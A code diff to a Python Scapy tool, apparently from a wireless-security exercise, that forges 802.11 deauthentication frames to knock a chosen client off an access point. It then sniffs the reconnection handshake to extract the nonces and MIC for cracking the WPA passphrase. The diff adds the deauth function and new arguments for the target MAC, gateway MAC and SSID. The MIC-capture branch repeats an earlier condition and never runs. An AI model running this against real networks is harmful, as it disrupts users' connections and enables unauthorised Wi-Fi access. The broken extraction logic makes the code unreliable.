@@ -21,6 +21,36 @@ from numpy import array
 import hmac, hashlib
 import argparse
 
+def deauth(Clientmac, APmac, iface):
+    dot11 = Dot11(addr1=Clientmac, addr2=APmac, addr3=APmac)
+   
+    # prepare the packet
+    packet = RadioTap()/dot11/Dot11Deauth(reason=4)
+    
+    # send the packet with all parameters
+    sendp(packet, inter=0.1, count=30, loop=0, iface=iface, verbose=1)
+    
+def wpa_sniff(packet):
+    global mic_to_test, SNonce, ANonce
+    
+    # Get Authenticator Nonce
+    # We are looking for Authentication request in the first key exchange
+    if packet.type == 0x2 and packet.subtype == 0x0:
+       ANonce = packet.load[13:45]
+       print(ANonce)
+
+    # Get Supplicant Nonce and MIC
+    # Get the SNonce based on the MAC address
+    elif packet.type == 0x2 and packet.subtype == 0x8:
+        SNonce = packet.load[13:45]
+        print(SNonce)
+
+    # Get MIC
+    elif packet.subtype == 0x8 and packet.type == 0x2:
+        mic_to_test = Dot11Elt(packet).load[129:-2].hex()
+        print(mic_to_test)
+    
+
 def customPRF512(key,A,B):
     """
     This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
@@ -37,54 +67,27 @@ def customPRF512(key,A,B):
 # add all arguments to parser
 parser = argparse.ArgumentParser(description="A python script to crack passphrase and deauthenticate client")
 parser.add_argument('interface', action="store", help="Specify a monitoring interface (ex. mon0)") 
-parser.add_argument("-d" , "--deauth", help="Specify if you want to deauthenticate after cracking passphrase", action="store_true")
+parser.add_argument("target", help="Target MAC address to deauthenticate.")
+parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
+parser.add_argument("ssid", help="SSID you want to attack")
+parser.add_argument("-d" , dest="deauth_bool", help="Specify if you want to deauthenticate after cracking passphrase", action="store_true")
 
 args = parser.parse_args()
 iface = args.interface
-deauth = args.deauth
+deauth_bool = args.deauth_bool
+target = args.target
+ap = args.gateway
+ssid = args.ssid
+
+if deauth_bool :
+    deauth(target, ap, iface)
 
 # Sniffing network on interface
-wpa = sniff(iface=iface, count=500)
+wpa = sniff(prn=wpa_sniff, iface=iface, count=50)
 
 # Name of network we want to attack
-ssid        = "SWI"
-mic_to_test = b''
-APmac       = b''
-Clientmac   = b''
-ANonce      = b''
-SNonce      = b''
-
-
-
-# Get APmac address and Clientmac address of capture
-# We are looking for an Association Request because it contains all parameters we need
-# We also check that ssid is the one that we are looking for
-for packet in wpa:
-    if packet.type == 0x0 and packet.subtype == 0x0 and packet.info.decode('ascii') == ssid:
-        APmac = a2b_hex(packet.addr1.replace(':', ''))
-        print("APmac : ", APmac)
-        Clientmac = a2b_hex(packet.addr2.replace(':', ''))
-        break
-    
-# Get Authenticator Nonce
-# We are looking for Authentication request in the first key exchange
-for packet in wpa:
-   if packet.type == 0x2 and packet.subtype == 0x0:
-       ANonce = packet.load[13:45]
-       break
-   
-isSNonce = False
-
-# Get Supplicant Nonce and MIC
-for packet in wpa:
-    # Get the SNonce based on the MAC address
-    if not isSNonce and packet.type == 0x2 and packet.subtype == 0x8 :
-        SNonce = packet.load[13:45]
-        isSNonce = True
-
-        # Get MIC
-    elif packet.subtype == 0x8 and packet.type == 0x2 :
-        mic_to_test = Dot11Elt(packet).load[129:-2].hex()
+APmac      = a2b_hex(ap.replace(':', ''))
+Clientmac      = a2b_hex(target.replace(':', ''))
     
 ssid = str.encode(ssid)
 
